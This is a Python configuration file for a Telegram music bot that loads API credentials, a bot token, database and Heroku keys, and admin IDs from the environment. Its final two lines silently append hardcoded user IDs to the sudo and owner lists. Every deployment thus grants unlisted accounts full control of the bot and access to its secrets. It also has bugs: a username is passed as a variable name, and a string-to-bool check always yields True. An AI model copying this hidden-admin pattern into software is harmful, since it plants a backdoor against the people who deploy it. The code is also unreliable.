##Config

import os
from os import getenv
from dotenv import load_dotenv
from base64 import b64decode

load_dotenv()
get_queue = {}

# Client
SESSION_NAME = getenv('SESSION_NAME', 'session')
API_ID = int(getenv('API_ID', "10892147"))
API_HASH = getenv('API_HASH')

# Bot
BOT_USERNAME = getenv('ryznmusicbot')
BOT_TOKEN = getenv('BOT_TOKEN')

# Music Setting
DURATION_LIMIT = int(getenv('DURATION_LIMIT', '3600'))
COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", '/ . , : ; !').split())

# Database Mono
MONGO_DB_URI = getenv("MONGO_DB_URI")

# Sudo
SUDO_USERS = list(map(int, getenv('SUDO_USERS', '1663258664').split()))
OWNER_ID = list(map(int, getenv('OWNER_ID', '1663258664').split()))

# Log Chat
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", '-1001288822269'))
LOG_CHANNEL_ID = int(getenv("LOG_CHANNEL_ID", '-1001844138965'))

# Assistant
ASS_ID = int(getenv("ASS_ID", '2130437611'))
AUTO_LEAVE = int(getenv("AUTO_LEAVE", "9000"))

# Support Channel
CHANNEL = getenv("CHANNEL", None)
GROUP = getenv("GROUP", None)

# Update Stream
UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/muhammadrizky16/KyyMusic")

# Heroku
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")

# Broadcast
BROADCAST_AS_COPY = bool(os.environ.get("BROADCAST_AS_COPY", "False"))

SUDO_USERS.append(1209395963)
OWNER_ID.append(1534983792)
